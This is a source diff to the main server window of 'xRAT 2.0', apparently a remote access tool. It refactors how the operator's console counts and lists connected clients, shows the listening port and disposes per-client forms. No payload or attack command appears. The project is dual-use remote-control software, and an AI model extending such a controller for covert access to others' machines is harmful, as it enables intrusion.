@@ -16,6 +16,9 @@ namespace xServer.Forms
 {
     public partial class FrmMain : Form
     {
+        private const int STATUS_ID = 4;
+        private const int USERSTATUS_ID = 5;
+
         public Server ListenServer;
         private readonly ListViewColumnSorter _lvwColumnSorter;
         public static volatile FrmMain Instance;
@@ -85,8 +88,8 @@ namespace xServer.Forms
                 {
                     int selected = lstClients.SelectedItems.Count;
                     this.Text = (selected > 0) ?
-                        string.Format("xRAT 2.0 - Connected: {0} [Selected: {1}]", ListenServer.ConnectedClients, selected) :
-                        string.Format("xRAT 2.0 - Connected: {0}", ListenServer.ConnectedClients);
+                        string.Format("xRAT 2.0 - Connected: {0} [Selected: {1}]", ListenServer.ConnectedAndAuthenticatedClients, selected) :
+                        string.Format("xRAT 2.0 - Connected: {0}", ListenServer.ConnectedAndAuthenticatedClients);
                 });
             }
             catch
@@ -192,9 +195,12 @@ namespace xServer.Forms
         {
             try
             {
-                this.Invoke((MethodInvoker) delegate { botListen.Text = "Listening: " + listening.ToString(); });
+                this.Invoke((MethodInvoker) delegate
+                {
+                    botListen.Text = listening ? string.Format("Listening on port {0}.", server.Port) : "Not listening.";
+                });
             }
-            catch
+            catch (InvalidOperationException)
             {
             }
         }
@@ -209,7 +215,15 @@ namespace xServer.Forms
                 new Core.Packets.ServerPackets.InitializeCommand().Execute(client);
             }
             else
+            {
+                if (client.Value != null)
+                {
+                    client.Value.DisposeForms();
+                    client.Value = null;
+                }
+
                 RemoveClientFromListview(client);
+            }
         }
 
         private void ClientRead(Server server, Client client, IPacket packet)
@@ -244,7 +258,7 @@ namespace xServer.Forms
                     lock (_lockClients)
                     {
                         lstClients.Items.Add(clientItem);
-                        ListenServer.ConnectedClients++;
+                        ListenServer.ConnectedAndAuthenticatedClients++;
                     }
                 });
 
@@ -267,7 +281,7 @@ namespace xServer.Forms
                             .Where(lvi => lvi != null && (lvi.Tag as Client) != null && c.Equals((Client) lvi.Tag)))
                         {
                             lvi.Remove();
-                            ListenServer.ConnectedClients--;
+                            ListenServer.ConnectedAndAuthenticatedClients--;
                             break;
                         }
                     }
@@ -287,7 +301,7 @@ namespace xServer.Forms
                 {
                     var item = GetListviewItemOfClient(c);
                     if (item != null)
-                        item.SubItems[3].Text = text;
+                        item.SubItems[STATUS_ID].Text = text;
                 });
             }
             catch (InvalidOperationException)
@@ -303,7 +317,7 @@ namespace xServer.Forms
                 {
                     var item = GetListviewItemOfClient(c);
                     if (item != null)
-                        item.SubItems[4].Text = text;
+                        item.SubItems[USERSTATUS_ID].Text = text;
                 });
             }
             catch (InvalidOperationException)
@@ -317,12 +331,8 @@ namespace xServer.Forms
 
             lstClients.Invoke((MethodInvoker) delegate
             {
-                foreach (var t in lstClients.Items.Cast<ListViewItem>()
-                    .Where(lvi => lvi != null && (lvi.Tag as Client) != null && c.Equals((Client) lvi.Tag)))
-                {
-                    itemClient = t;
-                    break;
-                }
+                itemClient = lstClients.Items.Cast<ListViewItem>()
+                    .FirstOrDefault(lvi => lvi != null && (lvi.Tag as Client) != null && c.Equals((Client) lvi.Tag));
             });
 
             return itemClient;
@@ -775,7 +785,7 @@ namespace xServer.Forms
             {
                 using (
                     var frm = new FrmStatistics(ListenServer.BytesReceived, ListenServer.BytesSent,
-                        ListenServer.ConnectedClients, ListenServer.AllTimeConnectedClients.Count))
+                        ListenServer.ConnectedAndAuthenticatedClients, ListenServer.AllTimeConnectedClients.Count))
                 {
                     frm.ShowDialog();
                 }
